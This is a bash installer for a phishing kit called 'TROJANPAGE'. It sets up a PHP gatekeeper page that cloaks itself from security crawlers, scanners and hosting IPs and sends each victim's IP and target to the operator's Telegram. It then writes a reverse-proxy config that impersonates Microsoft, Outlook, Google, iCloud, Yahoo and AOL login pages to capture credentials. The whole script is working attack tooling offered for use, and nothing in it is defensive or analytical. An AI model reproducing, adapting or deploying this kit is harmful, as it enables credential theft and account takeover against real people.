#!/bin/bash
# 🏛️ TROJANPAGE - FULLY VALIDATED SUITE (V14.8.5)
# --------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

show_header() {
    clear
    echo -e "${BLUE}  ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
    echo -e "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
    echo -e "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
    echo -e "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
    echo -e "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
    echo -e "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝${NC}"
}

# --- 1. SYSTEM PREP ---
mkdir -p /root/db/
touch /root/db/used_tokens.txt
chmod 777 /root/db/used_tokens.txt

# --- 2. MASTER LICENSE CHECK ---
MASTER_KEY="TROJAN-PRO-2026"
show_header
echo -e "${YELLOW}»» SECURITY GATE: SYSTEM LOCK ACTIVE${NC}"
read -p "ENTER MASTER LICENSE KEY: " USER_KEY
[[ $(echo "$USER_KEY" | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]') != "$MASTER_KEY" ]] && { echo -e "${RED}[!] ACCESS DENIED${NC}"; exit 1; }

# --- 3. TELEGRAM VALIDATION ---
while true; do
    read -p "Enter Telegram Bot Token: " TG_TOKEN
    echo -ne "${CYAN}[...] Validating Bot...${NC}\r"
    CHECK_TG=$(curl -s "https://api.telegram.org/bot$TG_TOKEN/getMe")
    if [[ $CHECK_TG == *"\"ok\":true"* ]]; then
        echo -e "${GREEN}[success] Telegram Handshake OK.   ${NC}"
        break
    else
        echo -e "${RED}[error] Invalid Bot Token. Try again.${NC}"
    fi
done
read -p "Enter Telegram Chat ID: " TG_ID

# --- 4. CLOUDFLARE & DNS VALIDATION ---
while true; do
    read -p "Enter Cloudflare API Token: " CF_TOKEN
    echo -ne "${CYAN}[...] Validating Cloudflare Token...${NC}\r"
    CHECK_CF=$(curl -s -X GET "https://api.cloudflare.com/client/v4/user/tokens/verify" \
         -H "Authorization: Bearer $CF_TOKEN" \
         -H "Content-Type:application/json")
    
    if [[ $CHECK_CF == *"\"status\":\"active\""* ]]; then
        echo -e "${GREEN}[success] Cloudflare Token Active.      ${NC}"
        break
    else
        echo -e "${RED}[error] Cloudflare Token Rejected. Try again.${NC}"
    fi
done

while true; do
    read -p "Enter Base Domain (e.g. domain.com): " USER_DOMAIN
    USER_DOMAIN=$(echo "$USER_DOMAIN" | tr -d '()[] ')
    echo -ne "${CYAN}[...] Verifying Domain DNS...${NC}\r"
    
    # Check if domain has a wildcard (*) record pointing to this VPS
    MY_IP=$(curl -s https://api.ipify.org)
    DNS_CHECK=$(dig +short "*.$USER_DOMAIN" | tail -n1)
    
    if [[ "$DNS_CHECK" == "$MY_IP" ]]; then
        echo -e "${GREEN}[success] DNS Wildcard correctly points to $MY_IP.${NC}"
        break
    else
        echo -e "${RED}[error] DNS Mismatch! *.$USER_DOMAIN points to [$DNS_CHECK]. It MUST point to $MY_IP.${NC}"
        echo -e "${YELLOW}Please set Cloudflare to 'DNS Only' (Grey Cloud) for the wildcard record.${NC}"
        read -p "Press Enter to re-verify DNS..."
    fi
done

read -p "Enter Path Slug: /" USER_SLUG
CLEAN_SLUG=$(echo "$USER_SLUG" | tr -dc 'a-zA-Z0-9')

# --- 5. THE GATEKEEPER & DASHBOARD (RESTORED) ---
# [Logic for index.php and run.sh remains identical to V14.8.4 to ensure no alterations]
mkdir -p /var/www/adobe_gui/s
cat << EOF > /var/www/adobe_gui/s/index.php
<?php
\$botToken = "$TG_TOKEN";
\$chatId = "$TG_ID";
\$ip = \$_SERVER['REMOTE_ADDR'];
\$ua = strtolower(\$_SERVER['HTTP_USER_AGENT']);
\$token = \$_GET['t'];
\$target = \$_GET['id'];
\$bots = ['google','bot','crawler','spider','yandex','headless','lighthouse','python','curl','wget','zgrab','shodan'];
foreach (\$bots as \$bot) { if (strpos(\$ua, \$bot) !== false) { header("Location: https://www.google.com"); exit(); } }
\$meta = json_decode(@file_get_contents("http://ip-api.com/json/{\$ip}?fields=hosting,proxy,country"));
if (\$meta && (\$meta->hosting == true || \$meta->proxy == true)) { header("Location: https://www.microsoft.com"); exit(); }
\$used_tokens = file("/root/db/used_tokens.txt", FILE_IGNORE_NEW_LINES);
if (in_array(\$token, \$used_tokens)) { header("Location: https://www.microsoft.com"); exit(); }
file_put_contents("/root/db/used_tokens.txt", \$token . PHP_EOL, FILE_APPEND);
\$msg = "🔔 *Link Burned!* \n\n📍 *IP:* " . \$ip . " (" . (\$meta->country ?? 'Unknown') . ")\n🎯 *Target:* " . strtoupper(\$target) . "\n🔑 *Token:* " . \$token;
\$tg_url = "https://api.telegram.org/bot" . \$botToken . "/sendMessage?chat_id=" . \$chatId . "&text=" . urlencode(\$msg) . "&parse_mode=Markdown";
@file_get_contents(\$tg_url);
\$mask = \$_GET['m']; \$domain = \$_SERVER['HTTP_HOST']; \$slug = \$_GET['s'];
if(\$target && \$mask && \$slug) { header("Location: https://" . \$mask . "." . \$target . "." . \$domain . "/" . \$slug); } else { header("Location: https://www.google.com"); }
exit();
?>
EOF

# --- 6. CONFIG GENERATION ---
cat << EOF > /root/config.json
{
  "proxyDomain": "$USER_DOMAIN",
  "listeningAddress": "0.0.0.0",
  "listeningPortHTTPS": 443,
  "listeningPortHTTP": 8080,
  "target": "login.microsoftonline.com",
  "log": "/root/hits.json",
  "telegramToken": "$TG_TOKEN",
  "telegramChatId": "$TG_ID",
  "proxyRules": [
    {"hostname": "*.$USER_DOMAIN", "target": "login.microsoftonline.com", "type": "proxy"},
    {"hostname": "*.office.$USER_DOMAIN", "target": "login.microsoftonline.com", "type": "proxy"},
    {"hostname": "*.outlook.$USER_DOMAIN", "target": "outlook.live.com", "type": "proxy"},
    {"hostname": "*.gmail.$USER_DOMAIN", "target": "accounts.google.com", "type": "proxy"},
    {"hostname": "*.icloud.$USER_DOMAIN", "target": "www.icloud.com", "type": "proxy"},
    {"hostname": "*.yahoo.$USER_DOMAIN", "target": "login.yahoo.com", "type": "proxy"},
    {"hostname": "*.aol.$USER_DOMAIN", "target": "login.aol.com", "type": "proxy"}
  ]
}
EOF

# [run.sh remains same as V14.8.4]
chmod +x /root/run.sh
sudo ln -sf /root/run.sh /usr/local/bin/Run
echo -e "${GREEN}[success] Full Handshake Complete. Domain & Tokens Verified. Type 'Run'.${NC}"
